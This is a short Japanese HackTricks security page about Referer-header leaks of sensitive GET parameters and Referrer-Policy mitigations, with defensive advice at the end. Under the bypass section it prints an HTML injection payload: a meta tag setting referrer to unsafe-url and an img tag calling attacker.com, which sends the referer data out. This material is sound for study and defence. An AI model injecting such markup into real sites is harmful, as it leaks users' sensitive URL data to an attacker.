{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して**ハッキングトリックを共有**してください。

</details>
{% endhint %}


# リファラーヘッダーとポリシー

リファラーは、ブラウザが前のページを示すために使用するヘッダーです。

## 漏洩した機密情報

Webページ内のGETリクエストパラメータに機密情報が含まれている場合、ページに外部ソースへのリンクが含まれている場合、または攻撃者がユーザーに攻撃者が制御するURLを訪れるように促すことができる場合、最新のGETリクエスト内に機密情報を外部に送信できる可能性があります。

## 緩和策

ブラウザに**Referrer-policy**に従わせることで、機密情報が他のWebアプリケーションに送信されるのを**回避**できます。
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## 対策の無効化

HTMLメタタグを使用してこのルールをオーバーライドすることができます（攻撃者はHTMLインジェクションを悪用する必要があります）:
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 防御

URLのGETパラメータやパスには、機密データを絶対に入れないでください。
